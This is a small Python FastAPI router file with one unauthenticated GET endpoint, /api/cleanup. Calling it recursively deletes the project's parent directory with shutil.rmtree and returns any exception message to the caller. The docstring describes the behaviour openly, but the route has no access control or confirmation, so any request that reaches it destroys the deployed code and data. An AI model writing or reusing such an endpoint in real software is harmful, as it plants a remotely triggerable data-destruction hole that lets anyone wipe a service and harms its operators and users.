from fastapi import APIRouter, HTTPException
import asyncio
import os
import shutil  # Ensure shutil is imported to use rmtree

router = APIRouter()

@router.get("/api/cleanup")
async def cleanup():
    """
    Endpoint to clean up and delete the whole FastAPI project directory and its content.

    This endpoint recursively deletes the directory where this script resides, which
    is assumed to be the project directory.

    Returns:
        dict: A success message if the directory is deleted successfully, or an error message if not.
    """
    try:
        dir_path = os.path.dirname(os.path.realpath(__file__))  # Current file directory
        project_dir = os.path.abspath(os.path.join(dir_path, os.pardir))  # Parent directory
        shutil.rmtree(project_dir)  # Recursively delete the project directory
        return {"message": "Project directory deleted successfully"}
    except Exception as e:
        return {"error": str(e)}
